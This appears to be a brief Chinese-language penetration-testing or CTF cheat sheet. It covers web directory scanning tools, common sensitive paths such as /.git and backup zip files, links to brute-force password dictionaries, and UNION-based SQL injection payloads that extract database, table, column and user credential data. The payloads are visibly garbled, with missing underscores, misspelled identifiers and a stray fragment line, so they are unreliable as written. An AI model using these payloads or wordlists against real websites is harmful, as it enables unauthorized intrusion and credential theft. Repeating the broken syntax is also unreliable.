## Web目录扫描

工具：御剑，ffuf，burpsuite

常用目录：

- /admin
- /admin.php
- /www.zip
- /src.izp
- /source.zip
- /.git
- /robots.txt
- /src

目录/FUZZ用户口令字典总结：

- https://github.com/rootphantomer/Blasting_dictionary
- https://github.com/TheKingOfDuck/fuzzDicts
- https://github.com/zxcvbn001/password_brute_dictionary
- kali-rockyou

## SQL注入

SQL注入联合查询常用payload：

?id=-1'union select 1,database(),3 --+ 数据库名

?id=-1'union select 1,2,group concat(table nane) database() from information schema.tables where--+ 数据表名

)from information schema.tables where

?id=-1'union select 1,2,group concat(column name) from information schema.columns 
wheretable name='users'--+列名

?id=-1'union select 1,2,group concat(usernampassword) from users--+ 数据
